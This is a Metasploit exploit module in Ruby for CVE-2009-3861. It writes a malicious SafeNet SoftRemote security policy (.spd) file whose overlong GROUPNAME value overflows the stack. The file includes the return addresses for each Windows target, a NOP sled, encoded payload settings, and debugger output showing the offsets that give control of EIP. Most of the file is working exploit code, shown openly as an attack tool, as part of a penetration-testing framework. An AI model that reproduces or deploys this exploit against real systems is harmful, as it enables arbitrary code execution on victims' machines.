##
# $Id: safenet_softremote_groupname.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SafeNet SoftRemote GROUPNAME Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in SafeNet SoftRemote
				Security Policy Editor <= 10.8.5. When an attacker
				creates a specially formatted security policy with an
				overly long GROUPNAME argument, it is possible to execute
				arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					[ 'CVE', '2009-3861' ],
					[ 'OSVDB', '59660'],
					[ 'URL', 'http://www.senseofsecurity.com.au/advisories/SOS-09-008' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "\x00\x0a\x0d",
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
					'DisableNops'   =>  'True',
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP3 English',  { 'Ret' => 0x7e47bcaf } ],
					[ 'WinSrv 2000 SP4 English', { 'Ret' => 0x78344dd3 } ],
					[ 'WinSrv 2000 SP2 English', { 'Ret' => 0x7843c1a1 } ],
					[ 'WinSrv 2003 Enterprise Edition SP1 (v1023) English', { 'Ret' => 0x7741246b } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Oct 30 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ false, 'The file name.',  'msf.spd']),
			], self.class)
	end

	def exploit
		# Need to cause the access violation!!
		sploit = rand_text_alpha_upper(20024)

		sploit[92,4] = [target.ret].pack('V')
		# Play it safe.
		sploit[96,100] = "\x90" * 100
		sploit[196,payload.encoded.length] = payload.encoded

		spd =  "REGEDIT4\n"
		spd << "[HKEY_LOCAL_MACHINE\\SOFTWARE\\IRE\\SafeNet/Soft-PK\\ACL]\n"
		spd << "\"CrlPollInterval\"=dword:00000001\n"
		spd << "\"CertPollingInterval\"=dword:0000000f\n"
		spd << "\"PolicyInterval\"=dword:000005a0\n"
		spd << "\"NETPROC\"=dword:00000003\n"
		spd << "\"LACTNETPROC\"=dword:00000003\n"
		spd << "\"BUILDVER\"=\"10.8.1 (Build 10)\"\n"
		spd << "\"NONNIPPROC\"=dword:00000001\n"
		spd << "\"STATICIP\"=dword:00000000\n"
		spd << "\"ENABLEGATEWAY\"=dword:00000000\n"
		spd << "\"ENABLELOGGING\"=dword:00000000\n"
		spd << "\"RETRANSTIMER\"=dword:0000000f\n"
		spd << "\"RETRYCOUNTER\"=dword:00000003\n"
		spd << "\"NOTIFICPAYLOADS\"=dword:00000001\n"
		spd << "\"PolicyServerPort\"=dword:00000185\n"
		spd << "\"UsePolicyServer\"=dword:00000000\n"
		spd << "\"PolicyServerName\"=""\n"
		spd << "\"NewPolicyResetsConns\"=dword:00000000\n"
		spd << "\"UseCerts\"=dword:00000000\n"
		spd << "\"PublishMyCert\"=dword:00000001\n"
		spd << "\"PolicySubtree\"=\"ou=SoftRemote, o=SafeNet\"\n"
		spd << "\"PDPMode\"=dword:00000000\n"
		spd << "\"PDPUrl\"=\"\"\n"
		spd << "\"UseProxyServer\"=dword:00000000\n"
		spd << "\"ProxyServer\"=\"\"\n"
		spd << "\"LdapServer\"=\"\"\n"
		spd << "\"DefaultCrlUrl\"=\"\"\n"
		spd << "\"EnableCrlPolling\"=dword:00000000\n"
		spd << "\"SCARD_CLEARS_KEYS\"=dword:00000000\n"
		spd << "\"VPNRequiresFirewall\"=dword:00000000\n"
		spd << "\"BypassRequiresFirewall\"=dword:00000000\n"
		spd << "\"MapVPNToFirewall\"=dword:00000000\n"
		spd << "\"MapPolicyToFirewall\"=dword:00000000\n"
		spd << "\"MapBypassToFirewall\"=dword:00000000\n"
		spd << "\"EnableFirewallLogging\"=dword:00000000\n"
		spd << "\"TCPENCAPPORT\"=dword:00000000\r\n\r\n"
		spd << "[HKEY_LOCAL_MACHINE\\SOFTWARE\\IRE\\SafeNet/Soft-PK\\ACL\\0]\n"
		spd << "\"ACTION\"=dword:00000001\n"
		spd << "\"TREENAME\"=\"Other Connections\"\n"
		spd << "\"GROUPID\"=\"_SafeNet_Default_Group\"\n"
		spd << "\"LOCKMODE\"=dword:00000000\n"
		spd << "\"USEMANKEYS\"=dword:00000000\n"
		spd << "\"USEPPKS\"=dword:00000000\n"
		spd << "\"USEPFS\"=dword:00000000\n"
		spd << "\"REPLAYDETECT\"=dword:00000001\n"
		spd << "\"MANUALONLY\"=dword:00000000\n"
		spd << "\"AGGRMODE\"=dword:00000000\n"
		spd << "\"P2GROUPDESC\"=dword:00000002\r\n\r\n"
		spd << "[HKEY_LOCAL_MACHINE\\SOFTWARE\\IRE\\SafeNet/Soft-PK\\ACL\\0\\MYID]\n"
		spd << "\"CERTIFICATELABEL\"=\"\"\n"
		spd << "\"CERTIFICATEISSUER\"=hex:\n"
		spd << "\"PORT\"=dword:ffffffff\n"
		spd << "\"PORTNAME\"=\"All\"\n"
		spd << "\"NET_INTFC\"=\"\"\n"
		spd << "\"InternalIP\"=dword:00000000\n"
		spd << "\"AUTOCERT\"=dword:00000001\n"
		spd << "\"TYPE\"=dword:00000009\n"
		spd << "\"FQDN\"=\"\"\n"
		spd << "\"UFQDN\"=\"\"\n"
		spd << "\"DN\"=hex:\n"
		spd << "\"PRESHR\"=hex:\r\n\r\n"
		spd << "[HKEY_LOCAL_MACHINE\\SOFTWARE\\IRE\\SafeNet/Soft-PK\\ACL\\0\\MYID\\VASUPPORT]\n"
		spd << "\"VASUPPORT\"=dword:00000000\r\n\r\n"
		spd << "[HKEY_LOCAL_MACHINE\\SOFTWARE\\IRE\\SafeNet/Soft-PK\\ACL\\0\\PH1PROPOSAL_0]\n"
		spd << "\"AUTHMETHOD\"=dword:00000003\n"
		spd << "\"PH1ENCRALG\"=dword:00000005\n"
		spd << "\"PH1KEYLEN\"=dword:00000000\n"
		spd << "\"PH1HASHALG\"=dword:00000002\n"
		spd << "\"GROUPDESC\"=dword:00000002\n"
		spd << "\"IKESALIFETYPE\"=dword:00000000\n"
		spd << "\"IKESADUR_KB\"=dword:00000000\n"
		spd << "\"IKESADUR_SEC\"=dword:00000000\r\n\r\n"
		spd << "[HKEY_LOCAL_MACHINE\\SOFTWARE\\IRE\\SafeNet/Soft-PK\\ACL\\0\\PH2PROPOSAL_0]\n"
		spd << "\"AH\"=dword:00000000\n"
		spd << "\"AHTRANSFORM\"=dword:00000003\n"
		spd << "\"AHENCAPMODE\"=dword:00000001\n"
		spd << "\"ESP\"=dword:00000001\n"
		spd << "\"KEYLENGTH\"=dword:00000000\n"
		spd << "\"ESPTRANSFORM\"=dword:00000003\n"
		spd << "\"ESPKEYLEN\"=dword:00000000\n"
		spd << "\"ESPHASHALG\"=dword:00000002\n"
		spd << "\"ESPENCAPMODE\"=dword:00000001\n"
		spd << "\"KEYLIFETYPE\"=dword:00000000\n"
		spd << "\"KEYDUR_KB\"=dword:00000000\n"
		spd << "\"KEYDUR_SEC\"=dword:00000000\n"
		spd << "\"IPCOMP\"=dword:00000000\n"
		spd << "\"IPCOMPTRANSFORM\"=dword:00000000\n"
		spd << "\"INMANSPI\"=dword:00000100\n"
		spd << "\"INMANAHKEY\"=hex:\n"
		spd << "\"INMANESPENCRKEY\"=hex:\n"
		spd << "\"INMANESPHMACKEY\"=hex:\n"
		spd << "\"OUTMANSPI\"=dword:00000100\n"
		spd << "\"OUTMANAHKEY\"=hex:\n"
		spd << "\"OUTMANESPENCRKEY\"=hex:\n"
		spd << "\"OUTMANESPHMACKEY\"=hex:\r\n\r\n"
		spd << "[HKEY_LOCAL_MACHINE\\SOFTWARE\\IRE\\SafeNet/Soft-PK\\ACL\\0\\PROXYADDRESS]\n"
		spd << "\"TYPE\"=dword:00000001\n"
		spd << "\"ADDR1\"=dword:00000000\n"
		spd << "\"ADDR2\"=dword:00000000\n"
		spd << "\"IPADDR\"=dword:00000000\n"
		spd << "\"USELDAP\"=dword:00000000\n"
		spd << "\"LOCATIONTYPE\"=dword:00000001\r\n\r\n"
		spd << "[HKEY_LOCAL_MACHINE\\SOFTWARE\\IRE\\SafeNet/Soft-PK\\ACL\\0\\REMOTEADDRESS]\n"
		spd << "\"TYPE\"=dword:00000001\n"
		spd << "\"ADDR1\"=dword:00000000\n"
		spd << "\"ADDR2\"=dword:00000000\n"
		spd << "\"IPADDR\"=dword:00000000\n"
		spd << "\"PROTOCOL\"=dword:ffffffff\n"
		spd << "\"PORT\"=dword:ffffffff\n"
		spd << "\"PORTNAME\"=\"All\"\n"
		spd << "\"USELDAP\"=dword:00000000\n"
		spd << "\"USESGW\"=dword:00000000\n"
		spd << "\"SGWOPTIONS\"=dword:00000000\r\n\r\n"
		spd << "[HKEY_LOCAL_MACHINE\\SOFTWARE\\IRE\\SafeNet/Soft-PK\\ACL\\CertReqDef]\n"
		spd << "\"NameChoice\"=dword:00000000\n"
		spd << "\"DeptChoice\"=dword:00000000\n"
		spd << "\"CompanyChoice\"=dword:00000000\n"
		spd << "\"StateChoice\"=dword:00000000\n"
		spd << "\"CountryChoice\"=dword:00000000\n"
		spd << "\"EmailChoice\"=dword:00000000\n"
		spd << "\"HostChoice\"=dword:00000000\n"
		spd << "\"IPChoice\"=dword:00000000\n"
		spd << "\"GetDefName\"=dword:00000001\n"
		spd << "\"GetDefDept\"=dword:00000000\n"
		spd << "\"GetDefCompany\"=dword:00000001\n"
		spd << "\"GetDefState\"=dword:00000000\n"
		spd << "\"GetDefCountry \"=dword:00000001\n"
		spd << "\"GetDefEmail\"=dword:00000001\n"
		spd << "\"GetDefHost\"=dword:00000001\n"
		spd << "\"GetDefIP\"=dword:00000001\n"
		spd << "\"DeptValue\"=\"\"\n"
		spd << "\"CompanyValue\"=\"\"\n"
		spd << "\"StateValue\"=\"\"\n"
		spd << "\"CountryValue\"=\"\"\r\n\r\n"
		spd << "[HKEY_LOCAL_MACHINE\\SOFTWARE\\IRE\\SafeNet/Soft-PK\\ACL\\GROUPDEFS]\r\n\r\n"
		spd << "[HKEY_LOCAL_MACHINE\\SOFTWARE\\IRE\\SafeNet/Soft-PK\\ACL\\GROUPDEFS\\_SafeNet_Default_Group]\n"
		spd << "\"GROUPLOCK\"=dword:00000000\n"
		spd << "\"GROUPNAME\"=\"#{sploit}\""

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(spd)

	end

end

=begin
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012c454 ebx=7e42f3c2 ecx=00bbe744 edx=00130000 esi=0012cfe0 edi=00bb54f0
eip=7c80beb9 esp=0012c430 ebp=0012c454 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\kernel32.dll -
kernel32!lstrcpy+0x18:
7c80beb9 8802            mov     byte ptr [edx],al          ds:0023:00130000=41
0:000> !exchain
0012c444: kernel32!ValidateLocale+2b0 (7c839ad8)
0012c4f8: 41386341
Invalid exception stack at 37634136
0:000> !load byakugan
[Byakugan] Successfully loaded!
0:000> !pattern_offset 20024 0x41386341
[Byakugan] Control of 0x41386341 at offset 84.
0:000> !pattern_offset 20024 0x37634136
[Byakugan] Control of 0x37634136 at offset 80.
0:000> !pattern_offset 20024
[Byakugan] Control of ecx at offset 80.
[Byakugan] Control of eip at offset 92.
=end
